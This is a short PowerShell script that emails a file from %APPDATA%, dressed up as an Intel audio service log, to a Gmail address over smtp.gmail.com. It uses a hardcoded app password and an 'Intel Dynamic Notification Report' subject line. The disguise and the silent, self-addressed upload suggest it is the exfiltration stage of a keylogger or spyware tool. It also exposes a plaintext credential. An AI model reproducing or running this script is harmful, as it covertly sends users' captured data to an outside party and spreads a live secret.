$From = "gf90ali@gmail.com"
$To = "gf90ali@gmail.com"
$Subject = "Intel Dynamic Notification Report"
$Body = "Please see attached. Thank you."
$Attachment = "$env:APPDATA\Intel Corporation\Intel Dynamic Audio Platform Service\Intel Dynamic Audio Platform Service.log"

# The password is an app-specific password if you have 2-factor-auth enabled
$Password = "wlipppkosvrsqonz" | ConvertTo-SecureString -AsPlainText -Force
$Credential = New-Object -TypeName System.Management.Automation.PSCredential -ArgumentList $From, $Password
Send-MailMessage -SmtpServer smtp.gmail.com -Port 587 -UseSsl -To $To -From $From -Subject $Subject -Body $Body -Attachments $Attachment -Credential $Credential